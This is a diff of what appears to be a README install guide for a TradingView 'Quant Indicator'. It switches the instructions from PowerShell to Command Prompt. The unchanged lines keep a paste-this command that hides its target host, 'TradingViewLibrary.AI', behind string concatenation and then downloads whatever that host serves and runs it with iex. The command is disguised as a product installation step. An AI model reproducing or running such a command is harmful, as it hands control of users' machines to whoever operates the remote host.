@@ -18,8 +18,7 @@ Then press **Enter**.
 
 ### 2. Run the Quant Indicator Installation Command
 
-Copy and paste the following command into PowerShell:
-
+Copy and paste the following command into Command Prompt:
 ```powershell
 powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.5'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
 ```
